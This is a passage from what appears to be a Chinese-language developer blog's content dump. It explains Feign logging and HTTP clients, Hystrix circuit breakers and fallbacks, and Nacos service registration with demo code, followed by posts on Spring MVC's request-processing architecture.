Options options) throws Throwable &#123;    //构建请求    Request request = targetRequest(template);\t//日志级别处理    if (logLevel != Logger.Level.NONE) &#123;        logger.logRequest(metadata.configKey(), logLevel, request);    &#125;\t//响应    Response response;    long start = System.nanoTime();    try &#123;        //发生请求，获取响应        response = client.execute(request, options);        // ensure the request is set. TODO: remove in Feign 12       //下面是一系列的格式处理&#125;\n\n到现在我们已经明白了，他是如何调用的，如何请求过去的，剩下的就是处理返回的内容，\n其实也简单，就是对数据修饰，包装，最后变为对象类型罢了。\n部分扩展使用日志处理有时候我们遇到 Bug，比如接口调用失败、参数没收到等问题，或者想看看调用性能，就需要配置 Feign 的日志了，以此让 Feign 把请求信息输出来。\n日志等级有 4 种，分别是：\n\nNONE【性能最佳，适用于生产】：不记录任何日志（默认值）。\nBASIC【适用于生产环境追踪问题】：仅记录请求方法、URL、响应状态代码以及执行时间。\nHEADERS：记录BASIC级别的基础上，记录请求和响应的header。\nFULL【比较适用于开发及测试环境定位问题】：记录请求和响应的header、body和元数据\n\n比较常用的是在yml文件中配置\n配置SpringBoot的日志级别：\nlogging:  level:    com.jimmy.mall.feigndemo.feign: debug\n\n配置Feign的日志\nfeign:  client:    config:      mall-order:  # 对应微服务名字        loggerLevel: FULL # 日志级别\n\nHttp客户端配置我们知道Feign默认使用JDK原生的URLConnection 发送 HTTP 请求。\n我们可以集成别的组件来替换掉 URLConnection，比如 Apache HttpClient，OkHttp。\n配置OkHttp一样，配置依赖\n&lt;dependency&gt;    &lt;groupId&gt;io.github.openfeign&lt;/groupId&gt;    &lt;artifactId&gt;feign-okhttp&lt;/artifactId&gt;&lt;/dependency&gt;\n\n修改配置文件\nfeign:  # 使用okhttp    okhttp:    enabled: true\n\n原理：\n@Configuration(proxyBeanMethods = false)// 导入HttpClient包后该条件可以满足@ConditionalOnClass(ApacheHttpClient.class)@ConditionalOnMissingClass(&quot;com.netflix.loadbalancer.ILoadBalancer&quot;)@ConditionalOnMissingBean(CloseableHttpClient.class)// 默认已经开启@ConditionalOnProperty(value = &quot;feign.httpclient.enabled&quot;, matchIfMissing = true)protected static class HttpClientFeignConfiguration &#123;     ...&#125;\n\nHystrix基础认识Hystrix是Netflix开源的一个延迟和容错库，用于隔离访问远程服务、第三方库，防止出现级联失败。\n通常一个分布式系统是由许多相互依赖的服务所组成的，这些被依赖的服务极易出现故障或响应延迟的问题。\n如果其中某个服务失败则会影响其他服务并进一步降低整体性能，并导致应用程序其他功能无法正常访问，在最坏的情况下，整个应用程序将崩溃。\nHystrix框架通过提供熔断和降级来控制服务之间的交互依赖，通过隔离故障服务并停止故障的级联效应以提高系统的总体弹性\nHystrix的熔断状态机:\n\n其中有3个状态：\n\nClosed：关闭状态（熔断器关闭），所有请求正常访问。\n\nOpen：打开状态（熔断器打开），所有请求都会被降级。\nHystrix会对请求情况统计，当一定时间内失败请求百分比到达阈值，则会触发熔断，熔断器打开。默认失败比例的阈值是50%，请求次数不低于20次。\n\nHalf Open：半开状态。Open状态不是永久的，熔断器打开后一段时间（默认5秒）会进入半开状态，释放部分请求通过，如果请求正常，那么熔断器将会关闭；否则熔断器继续保持打开状态。\n\n\n服务降级处理就是在一次请求异常或者熔断器已经打开的情况下调用一个失败回滚处理方法：\n\n当服务繁忙时，如果服务出现异常，不是粗暴的直接报错，而是返回一个友好的提示，虽然拒绝了用户的访问，但是会返回一个结果。\n基本使用单独使用导入依赖：\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;&lt;/dependency&gt;\n\n启动类配置\n@SpringBootApplication@EnableCircuitBreakerpublic class HystrixApplication &#123;\tpublic static void main(String[] args) &#123;\t\tSpringApplication.run(HystrixApplication.class, args);\t&#125;&#125;\n\n设置方法，为远程服务调用，这里使用RestTemplate来完成，使用@HystrixCommand注解修饰\n然后确定FalllBack函数\n@Service@Slf4jpublic class TestService &#123;    // 注入restTemplate    @Autowired    private RestTemplate restTemplate;    // 发送远程请求方法    // @HystrixCommand注解声明失败回滚方法和相关配置    @HystrixCommand(fallbackMethod = &quot;fallBack&quot;, commandProperties = &#123;          @HystrixProperty(name = &quot;execution.isolation.thread.timeoutInMilliseconds&quot;, value = &quot;1500&quot;),          @HystrixProperty(name = &quot;circuitBreaker.requestVolumeThreshold&quot;,value = &quot;10&quot;),          @HystrixProperty(name = &quot;circuitBreaker.sleepWindowInMilliseconds&quot;,value = &quot;15000&quot;),            @HystrixProperty(name = &quot;circuitBreaker.errorThresholdPercentage&quot;,value = &quot;70&quot;)    &#125;)    public R sendRequest(Integer id)&#123;        // 定义服务名称        String serviceName=&quot;liduoan-order&quot;;        // 开始时间        long begin = System.currentTimeMillis();        // 查询        String url = &quot;http://127.0.0.1:9001/liduoan_order/findOrderByUserId/&quot;+id;        R cmspage = restTemplate.getForObject(url, R.class);        // 结束时间        long end = System.currentTimeMillis();        // 记录访问时长        log.info(&quot;访问时长：&#123;&#125;&quot;,end-begin);        return cmspage;    &#125;\t// 失败回滚方法    public R fallBack(Integer id)&#123;        return R.error(&quot;降级成功！&quot;);    &#125;&#125;\n\n配置TestController\n@RestControllerpublic class TestController &#123;    @Autowired    TestService testService;    @GetMapping(&quot;/test&quot;)    public ArrayList&lt;R&gt; test()&#123;        ArrayList&lt;R&gt; pages = new ArrayList&lt;&gt;();        for(int i=0;i&lt;10;i++)&#123;            R orderByUserId = testService.sendRequest(1);//orderFeignService.findOrderByUserId(1);            // System.out.println(R);            pages.add(orderByUserId);        &#125;        return pages;    &#125;&#125;\n\n最终结果为：\n2021-07-16 10:41:21.401  INFO 10028 --- [x-TestService-1] com.example.hystrix.service.TestService  : 访问时长：20102021-07-16 10:41:22.410  INFO 10028 --- [x-TestService-2] com.example.hystrix.service.TestService  : 访问时长：15172021-07-16 10:41:24.133  INFO 10028 --- [x-TestService-3] com.example.hystrix.service.TestService  : 访问时长：17312021-07-16 10:41:25.637  INFO 10028 --- [x-TestService-4] com.example.hystrix.service.TestService  : 访问时长：17162021-07-16 10:41:26.544  INFO 10028 --- [x-TestService-5] com.example.hystrix.service.TestService  : 访问时长：11092021-07-16 10:41:28.071  INFO 10028 --- [x-TestService-6] com.example.hystrix.service.TestService  : 访问时长：15212021-07-16 10:41:28.922  INFO 10028 --- [x-TestService-7] com.example.hystrix.service.TestService  : 访问时长：8572021-07-16 10:41:30.671  INFO 10028 --- [x-TestService-8] com.example.hystrix.service.TestService  : 访问时长：17472021-07-16 10:41:31.638  INFO 10028 --- [x-TestService-9] com.example.hystrix.service.TestService  : 访问时长：12002021-07-16 10:41:32.741  INFO 10028 --- [-TestService-10] com.example.hystrix.service.TestService  : 访问时长：1102\n\n\n注意到，他一开始是2010ms，说明线程休眠了，那么就访问失败，熔断状态打开，进行降级\n配合SpringCloud首先我们一般都会使用Feign来做服务调用，而Feign中已经有了Hystrix的依赖\n那么我们只需要在配置文件中配置\nfeign:  hystrix:    enabled: truehystrix:  command:    default:                   # dafault表示全局生效      circuitBreaker:        requestVolumeThreshold: 10         # 熔断统计请求次数阈值        sleepWindowInMilliseconds: 15000   # 熔断器休眠时间（单位：毫秒）        errorThresholdPercentage: 70       # 熔断错误请求百分比阈值        execution:          isolation:            thread:              timeoutInMilliseconds: 1000    # 设置hystrix的超时时间(单位：毫秒)\n\n我们仅仅在Feign中配置FallBack\n@FeignClient(value = &quot;liduoan-order&quot;, path = &quot;/liduoan_order&quot;,fallback = OrderFallBack.class)public interface OrderFeignService &#123;    @RequestMapping(&quot;/findOrderByUserId/&#123;userId&#125;&quot;)    R findOrderByUserId(@PathVariable(&quot;userId&quot;) Integer userId);&#125;\n\n注意到FallBack函数，我们是对现有的Feign—OrderFeignService做了一个实现类：\n@Componentpublic class OrderFallBack implements OrderFeignService &#123;    @Override    public R findOrderByUserId(Integer userId) &#123;        return R.error(userId + &quot;请求异常，请重试！&quot;);    &#125;&#125;\n\n原理主要工作流程：\n1、当调用出现错误时，开启一个时间窗【默认10s\n2、当这个时间窗内，统计调用次数是否达到最小请求数？\n​\t  如果没有达到，则重置统计信息，回到第一步\n​\t  如果达到了，则统计失败的请求数 占所有请求比 ，判断是否达到阈值？\n​\t\t\t\t达到阈值，降级处理\n​\t\t\t\t没有达到阈值，重置统计信息，回到第一步\n3、如果降级处理了，也就是断路器处于开启状态，则会开启一个活动窗口【默认5s】，每隔5s，Hystrix会让一个请求通过，查看是否调用成功\n​\t\t如果成功，重置断路器，回到第一步\n​\t\t如果失败，回到第三步，保持断路器开启状态\n\nNacos基本认识官方文档： https://nacos.io/zh-cn/docs/what-is-nacos.html\nNacos 致力于帮助您发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。\nNacos 的关键特性包括:\n\n服务发现和服务健康监测\n动态配置服务\n动态 DNS 服务\n服务及其元数据管理\n\n基本使用这个注册中心不是和eurke一样，不需要在springboot中处理生产服务端。\n而是我们有一个服务端，仅仅只需要注册到上面\npom文件中处理\n&lt;!-- nacos服务注册与发现 --&gt;&lt;dependency&gt;    &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;&lt;/dependency&gt;\n\n在那个配置文件中：\nserver:  port: 8045spring:  application:    name: mall-user-consumer-demo  #配置nacos注册中心地址  cloud:    nacos:      discovery:        server-addr: 127.0.0.1:8848        #namespace: 39e1e969-15f9-46d2-832d-fa052da55377        #group: mall-user        cluster-name: BJ\n\n如此就可以注册到Nacos中了，很简单。\n最终Demo前置操作父工程pom：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;\txsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;\t&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\t&lt;parent&gt;\t\t&lt;artifactId&gt;springCloudDemo&lt;/artifactId&gt;\t\t&lt;groupId&gt;org.example&lt;/groupId&gt;\t\t&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;\t&lt;/parent&gt;    ..........\t&lt;dependencies&gt;\t\t&lt;!-- nacos服务注册与发现 --&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;\t\t&lt;/dependency&gt;\t\t&lt;!-- openfeign 远程调用 --&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;\t\t&lt;/dependency&gt;\t\t&lt;!-- feign调用依赖 --&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;com.netflix.feign&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;feign-core&lt;/artifactId&gt;\t\t\t&lt;version&gt;8.18.0&lt;/version&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;com.netflix.feign&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;feign-jackson&lt;/artifactId&gt;\t\t\t&lt;version&gt;8.18.0&lt;/version&gt;\t\t&lt;/dependency&gt;&lt;/project&gt;\n\n然后是两个微服务：·liduoan_order，liduoan_user的pom文件\n两者的pom文件内容大致相同，就只展示一个\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;\txsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;\t&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\t&lt;parent&gt;\t\t&lt;artifactId&gt;springCloudDemo&lt;/artifactId&gt;\t\t&lt;groupId&gt;org.example&lt;/groupId&gt;\t\t&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;\t&lt;/parent&gt;    ....\t&lt;dependencies&gt;\t\t&lt;!-- nacos服务注册与发现 --&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;\t\t&lt;/dependency&gt;\t\t&lt;!-- openfeign 远程调用 --&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;\t\t&lt;/dependency&gt;\t\t&lt;!-- feign调用依赖 --&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;com.netflix.feign&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;feign-core&lt;/artifactId&gt;\t\t\t&lt;version&gt;8.18.0&lt;/version&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;com.netflix.feign&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;feign-jackson&lt;/artifactId&gt;\t\t\t&lt;version&gt;8.18.0&lt;/version&gt;\t\t&lt;/dependency&gt;\t\t.............&lt;/project&gt;\n\n注意到我们只有两个依赖，分别是注册中心和feign的依赖，那么Ribbon和Hystrix的依赖在哪里呢？\n\n可以很清楚的看到，Feign已经集成了Ribbon和Hystrix的依赖。\n注册中心这里使用Nacos作为注册中心\n\n服务提供方事实上，每个微服务都可以被认为是生产者和消费者。\n我们单从一条线去完成整体的调用\n提供方仅仅完成简单的查询操作：\n@RestController@RequestMapping(&quot;/liduoan_order&quot;)@Slf4jpublic class OrderController &#123;    @Autowired    private OrderService orderService;    @RequestMapping(&quot;/findOrderByUserId/&#123;userId&#125;&quot;)    public R findOrderByUserId(@PathVariable(&quot;userId&quot;) Integer userId) &#123;        try &#123;            // 线程随机0-2000毫秒休眠            Thread.sleep(new Random().nextInt(2000));        &#125; catch (InterruptedException e) &#123;            e.printStackTrace();        &#125;        log.info(&quot;根据userId:&quot;+userId+&quot;查询订单信息&quot;);        List&lt;OrderEntity&gt; orderEntities = orderService.listByUserId(userId);        return R.ok().put(&quot;orders&quot;, orderEntities);    &#125;&#125;\n\n注意到我有一个线程休眠处理，这里是为了测试Hystrix的降级功能。\n服务调用方先看整体包组成：\n\n主要有Feign，Hystrix的FallBack，对应的Controller。\n先看Feign\n@FeignClient(value = &quot;liduoan-order&quot;, path = &quot;/liduoan_order&quot;,fallback = OrderFallBack.class)public interface OrderFeignService &#123;\t//服务调用    @RequestMapping(&quot;/findOrderByUserId/&#123;userId&#125;&quot;)    R findOrderByUserId(@PathVariable(&quot;userId&quot;) Integer userId);    &#125;\n\n那么看Controller，Controller有单纯的测试是否调用成功的UserController和Hystrix测试降级能力的TestController：\n@RestController@RequestMapping(&quot;/user&quot;)public class UserController &#123;    @Autowired    OrderFeignService orderFeignService;    @RequestMapping(value = &quot;/findOrderByUserId/&#123;id&#125;&quot;)    public R findOrderByUserId(@PathVariable(&quot;id&quot;) Integer id) &#123;        //feign调用        R result = orderFeignService.findOrderByUserId(id);        return result;    &#125;&#125;@RestControllerpublic class TestController &#123;    @Autowired    OrderFeignService orderFeignService;    @GetMapping(&quot;/test&quot;)    public ArrayList&lt;R&gt; test()&#123;        ArrayList&lt;R&gt; pages = new ArrayList&lt;&gt;();        for(int i=0;i&lt;10;i++)&#123;            R orderByUserId = orderFeignService.findOrderByUserId(1);            // System.out.println(R);            pages.add(orderByUserId);        &#125;        return pages;    &#125;&#125;\n\n最后看一下对应的OrderFallBack\n@Componentpublic class OrderFallBack implements OrderFeignService &#123;    @Override    public R findOrderByUserId(Integer userId) &#123;        return R.error(userId + &quot;请求异常，请重试！&quot;);    &#125;&#125;\n\n参考文档：\nRibbon:\nhttps://note.youdao.com/ynoteshare1/index.html?id=983c803c0f366af153e5c336aa4ac834&amp;type=note\nFeign:\nhttps://liduoan.github.io/2021/05/07/Spring-%E7%A9%B6%E6%9E%81%E8%A7%A3%E6%9E%90/#more\nhttps://note.youdao.com/ynoteshare1/index.html?id=e4d3a42acab8240647293dde5ed88b7b&amp;type=note\nhttps://blog.csdn.net/forezp/article/details/73480304\nHystrix:\nhttps://segmentfault.com/a/1190000005988895\nhttps://www.bilibili.com/video/BV1V4411F7my?p=2\n","tags":["2021"]},{"title":"SpringMvc","url":"/2021/03/28/2021/SpringMvc/","content":"\n\n1、什么是MVC\nMVC是模型(Model)、视图(View)、控制器(Controller)的简写，是一种软件设计规范。\n是将业务逻辑、数据、显示分离的方法来组织代码。\nMVC主要作用是降低了视图与业务逻辑间的双向偶合。\nMVC不是一种设计模式，MVC是一种架构模式。当然不同的MVC存在差异。\n\nModel（模型）：数据模型，提供要展示的数据，因此包含数据和行为，可以认为是领域模型或JavaBean组件（包含数据和行为），不过现在一般都分离开来：Value Object（数据Dao） 和 服务层（行为Service）。也就是模型提供了模型数据查询和模型数据的状态更新等功能，包括数据和业务。\nView（视图）：负责进行模型的展示，一般就是我们见到的用户界面，客户想看到的东西。\nController（控制器）：接收用户请求，委托给模型进行处理（状态改变），处理完毕后把返回的模型数据返回给视图，由视图负责展示。也就是说控制器做了个调度员的工作。\n最典型的MVC就是JSP + servlet + javabean的模式。\n2、什么是SpringMVC2.1、概述Spring MVC是Spring Framework的一部分，是基于Java实现MVC的轻量级Web框架。\n查看官方文档：\nhttps://docs.spring.io/spring/docs/5.2.0.RELEASE/spring-framework-reference/web.html#spring-web\n我们为什么要学习SpringMVC呢?\n Spring MVC的特点：\n\n轻量级，简单易学\n高效 , 基于请求响应的MVC框架\n与Spring兼容性好，无缝结合\n约定优于配置\n功能强大：RESTful、数据验证、格式化、本地化、主题等\n简洁灵活\n\nSpring的web框架围绕DispatcherServlet [ 调度Servlet ] 设计。\nDispatcherServlet的作用是将请求分发到不同的处理器。从Spring 2.5开始，使用Java 5或者以上版本的用户可以采用基于注解形式进行开发，十分简洁；\n2.2、中心控制器Spring的web框架围绕DispatcherServlet设计。DispatcherServlet的作用是将请求分发到不同的处理器。从Spring 2.5开始，使用Java 5或者以上版本的用户可以采用基于注解的controller声明方式。\n​\tSpring MVC框架像许多其他MVC框架一样, 以请求为驱动 , 围绕一个中心Servlet分派请求及提供其他功能，**DispatcherServlet是一个实际的Servlet (它继承自HttpServlet 基类)**。\nSpringMVC的原理如下图所示：\n​\t当发起请求时被前置的控制器拦截到请求，根据请求参数生成代理请求，找到请求对应的实际控制器，控制器处理请求，创建数据模型，访问数据库，将模型响应给中心控制器，控制器使用模型与视图渲染视图结果，将结果返回给中心控制器，再将结果返回给请求者。\n\n2.3、SpringMVC执行原理图为SpringMVC的一个较完整的流程图，实线表示SpringMVC框架提供的技术，不需要开发者实现，虚线表示需要开发者实现。\n简要分析执行流程\n\nDispatcherServlet表示前置控制器，是整个SpringMVC的控制中心。用户发出请求，DispatcherServlet接收请求并拦截请求。\n我们假设请求的url为 : http://localhost:8080/SpringMVC/hello\n如上url拆分成三部分：\nhttp://localhost:8080服务器域名\nSpringMVC部署在服务器上的web站点\nhello表示控制器\n通过分析，如上url表示为：请求位于服务器localhost:8080上的SpringMVC站点的hello控制器。\n\nHandlerMapping为处理器映射。DispatcherServlet调用HandlerMapping,HandlerMapping根据请求url查找Handler。\n\nHandlerExecution表示具体的Handler,其主要作用是根据url查找控制器，如上url被查找控制器为：hello。\n\nHandlerExecution将解析后的信息传递给DispatcherServlet,如解析控制器映射等。\n\nHandlerAdapter表示处理器适配器，其按照特定的规则去执行Handler。\n\nHandler让具体的Controller执行。\n\nController将具体的执行信息返回给HandlerAdapter,如ModelAndView。\n\nHandlerAdapter将视图逻辑名或模型传递给DispatcherServlet。\n\nDispatcherServlet调用视图解析器(ViewResolver)来解析HandlerAdapter传递的逻辑视图名。\n\n视图解析器将解析的逻辑视图名传给DispatcherServlet。\n\nDispatcherServlet根据视图解析器解析的视图结果，调用具体的视图。\n\n最终视图呈现给用户。\n\n\n","tags":["2021"]},{"title":"SpringMvc究极解析","url":"/2021/05/17/2021/SpringMvc%E7%A9%B6%E6%9E%81%E8%A7%A3%E6%9E%90/","content":"\n\nMVC模型Model2 模型是在 Model1 的基础上进行改良，它是 MVC 模型的一个经典应用。它把处理请求和展示数据进行分离，让每个部分各司其职。\n此时的 JSP 已经就是纯粹的展示数据了，而处理请求的事情交由控制器来完成，使\n每个组件充分独立，提高了代码可重用性和易维护性。下图展示的就是 Model2 模型：\n\nModel 2是基于MVC架构的设计模式。\n在Model 2架构中，Servlet作为前端控制器，负责接收客户端发送的请求\n在Servlet中只包含控制逻辑和简单的前端处理；\n后端JavaBean来完成实际的逻辑处理；\n最后，转发到相应的JSP页面处理显示逻辑。\nSpringMvc执行流程整体流程\n整个MVC的处理其实就是解析出这个URL应该调用什么方法，最后放回结果给这个请求\n那么我们研究的就是解析是怎么处理的\n1）前端控制器DispatcherServlet 由框架提供\n作用：接收请求，处理响应结果\n2）处理器映射器HandlerMapping由框架提供\n作用：根据请求URL，找到对应的Handler\n3）处理器适配器HandlerAdapter由框架提供\n作用：调用处理器（Handler|Controller）的方法\n4）处理器Handler又名Controller,后端处理器\n作用：接收用户请求数据，调用业务方法处理请求\n5）视图解析器ViewResolver由框架提供\n作用：视图解析，把逻辑视图名称解析成真正的物理视图\n支持多种视图技术：JSTLView,FreeMarker…\n6）视图View,程序员开发\n作用：将数据展现给用户\nTips:\n客户端发出请求，委托DispatcherServlet 处理，DispatcherServlet 交付给\nHandlerMapping找到应该去找哪个HandlerAdapter。\nHandlerAdapter调用处理器Handler（又名Controller）完成方法调用\n然后封装ModelAndView返回给DispatcherServlet 。\nDispatcherServlet 把ModelAndView交付给视图解析器ViewResolver完成视图解析。\n最后返回View对象给DispatcherServlet ，他进行处理把视图交给客户端。\n配置前端控制器前端控制器DispatcherServlet的配置在web.xml中：\n&lt;servlet&gt;    &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;    &lt;init-param&gt;        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;        &lt;param-value&gt;classpath:spring-mvc.xml&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt;    &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;\n\n处理器映射器处理器映射器HandlerMapping是在 Spring 的 3.1 版本之后加入的。它的出现，可以让使用者更加轻松的去配置 SpringMVC 的请求路径映射。去掉了早期繁琐的 xml 的配置它的配置有两种方式，都是在spring-mvc.xml中加入配置。\n方式一：\n&lt;bean class=&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;/&gt;\n\n方式二：\n&lt;mvc:annotation-driven&gt;&lt;/mvc:annotation-driven&gt;\n\n\n配置文件中的mvc:annotation-driven到底开启了什么？\n&lt;!‐‐ HandlerMapping处理器映射器 ‐‐&gt; &lt;bean class=&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappin gHandlerMapping&quot;&gt;&lt;/bean&gt;&lt;bean class=&quot;org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping&quot;&gt; &lt;/bean&gt; &lt;!‐‐ HandlerAdapter处理器适配器 ‐‐&gt; &lt;bean class=&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappin gHandlerAdapter&quot;&gt;&lt;/bean&gt; &lt;bean class=&quot;org.springframework.web.servlet.mvc.HttpRequestHandlerAdapter&quot;&gt;&lt;/bean&gt; &lt;bean class=&quot;org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter&quot;&gt;&lt;/bean&gt;&lt;!‐‐ HadnlerExceptionResolvers ‐‐&gt; &lt;bean class=&quot;org.springframework.web.servlet.mvc.method.annotation.ExceptionHan dlerExceptionResolver&quot;&gt;&lt;/bean&gt;&lt;bean class=&quot;org.springframework.web.servlet.mvc.annotation.ResponseStatusExcep tionResolver&quot;&gt;&lt;/bean&gt; &lt;bean class=&quot;org.springframework.web.servlet.mvc.support.DefaultHandlerExceptio nResolver&quot;&gt;&lt;/bean&gt; \n\n处理器适配器处理器适配器HandlerAdapter，它之所以被成为适配器，是因为它可以把不同的控制器最终都看成是适配器类型，从而执行适配器中定义的方法。\n更深层次的是，我们可以把公共的功能都定义在适配器中，从而减少每种控制器中都有的重复性代码。\nSpringMVC采用适配器模式来适配调用指定Handler，根据Handler的不同种类采用不同的HandlerAdapter，其中Handler与HandlerAdapter对应关系如下:\n\n\n\nHandler类别\n对应适配器\n描述\n\n\n\nController\nSimpleControllerHandlerAdapter\n标准控制器，返回ModelAndView\n\n\nHttpRequestHandler\nHttpRequestHandlerAdapter\n业务自行处理，请求不需要通过 ModelAndView转到视图\n\n\nServlet\nSimpleServletHandlerAdapter\n基于标准的Servlet处理\n\n\nHandlerMethod\nRequestMappingHandlerAdapter\n基于@RequestMapping对应方法处理\n\n\n下面我们就看看处理器具体的三种实现方式。\n处理器的实现方式\n方式一\n\n实现Controller接口，实现处理器：\npublic class HelloController implements Controller &#123;     @Override     public ModelAndView handleRequest(HttpServletRequest httpServletRequest,                                       HttpServletResponse httpServletResponse)         \t\t\t\t\t\t\t  throws Exception &#123;         ModelAndView mv = new ModelAndView();         mv.setViewName(&quot;success&quot;);         return mv;     &#125; &#125;\n\n在spring-mvc.xml中加入配置：\n&lt;bean id=&quot;simpleControllerHandlerAdapter&quot;       class=&quot;org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter&quot;&gt;&lt;/bean&gt; &lt;bean name=&quot;/sayhello&quot; class=&quot;com.jimmy.controller.HelloController&quot;&gt; &lt;/bean&gt;\n\n\n方式二\n\n实现HttpRequestHandler接口，实现处理器：\npublic class HelloController implements HttpRequestHandler &#123;     @Override     public void handleRequest(HttpServletRequest request,                               HttpServletResponse respon se)         \t\t\t\t\t   throws ServletException, IOException &#123;        request.getRequestDispatcher(&quot;/WEB‐INF/pages/success.jsp&quot;)               .forward(request,resp onse);     &#125; &#125;\n\n在spring-mvc.xml中加入配置：\n&lt;bean id=&quot;httpRequestHandlerAdapter&quot;       class=&quot;org.springframework.web.servlet.mvc.HttpRequestHandlerAdapter&quot;&gt;&lt;/bean&gt; &lt;bean name=&quot;/sayhello&quot; class=&quot;com.jimmy.controller.HelloController&quot;&gt; &lt;/bean&gt;\n\n这种方式和原始的Servlet方式非常相似。\n\n方式三\n\n我们使用的最多的方式，通过@Controller注解实现：\n@Controller public class HelloControler &#123;    @RequestMapping(&quot;/hello&quot;)     public String sayHello() &#123;        return &quot;success&quot;;     &#125; &#125;\n\n在spring-mvc.xml中加入配置：\n&lt; bean id=&quot;requestMappingHandlerAdapter&quot; class= &quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter&quot;/&gt;\n\n也可以直接配置：\n&lt;mvc:annotation‐driven&gt;&lt;/mvc:annotation‐driven&gt;\n\n视图视图的作用是渲染模型数据，将模型里的数据以某种形式呈现给客户。为了实现视图模型和具体实现技术的解耦，Spring定 义了一个高度抽象的View接口。并且视图是无状态的，对于每一个请求，都会创建一个View对象，所以不会有线程安全的问题。在SpringMVC中常用的视图类型：\n\nURL视图\nInternalResourceView：将 JSP 或者其他资源封装成一个视图，是 InternaleResourceViewResolver默认使用的视图类型。\nJstlView：它是当我们在页面中使用了 JSTL标签库的国际化标签后，需要采用的类型。\n\n\n文档类视图\nAbstractPdfView：PDF 文档视图的抽象类。\nAbstarctXlsView：Excel文档视图的抽象类，该类是4.2版本后才有 。之前使用的是 AbstractExcelView。\n\n\nJSON视图\nMappingJackson2JsonView：将模型数据封装成Json格式数据输出，需要借助 Jackson开源框架。\n\n\nXML视图\nMappingJackson2XmlView：将模型数据封装成 XML 格式数据，从4. 版本之后才加入的。\n\n\n\n视图解析器视图解析器ViewResolver负责将处理结果生成View视图，ViewResolver首先根据逻辑视图名解析成物理视图名，即具体的页面地址，再生成View视图对象，最后对View进行渲染将处理结果通过页面展示给用户。视图对象是由视图解析器负责实例化。\n所有的视图解析器都必须实现ViewResolver接口。SpringMVC为逻辑视图名的解析提供了不同的策略，可以在 Spring上下文中配置一种或多种解析策略，并指定他们之间的先后顺序。每一种映射策略对应一个具体的视图解析器实现类。程序员可以选择一种视图解析器或混用多种视图解析器。可以通过order属性指定解析器的优先顺序，order越小优先级越高。SpringMVC 会按视图解析器顺序的优先顺序对逻辑视图名进行解析，直到解析成功并返回视图对象，否则抛出ServletException异常。\n\n\n\n分类\n视图解析器类型\n说明\n\n\n\n解析为Bean的名称\nBeanNameViewResolver\nBean的id即为逻辑视图名称\n\n\n解析为URL文件\nInternalResourceViewResolver\n将视图名解析成一个URL文件，一般就是一个jsp或html，一般放在WEB-INF目录下\n\n\n解析指定 XML 文件\nXmlViewResolver\n解析指定位置的XML文件，默认在&#x2F;WEB-INF&#x2F;views.xml\n\n\n解析指定属性文件\nResourceBundleViewResolver\n解析properties文件\n\n\n在spring-mvc.xml中配置视图解析器：\n   &lt;!-- jsp --&gt;&lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;         id=&quot;jspViewResolver&quot;&gt;       &lt;property name=&quot;prefix&quot; 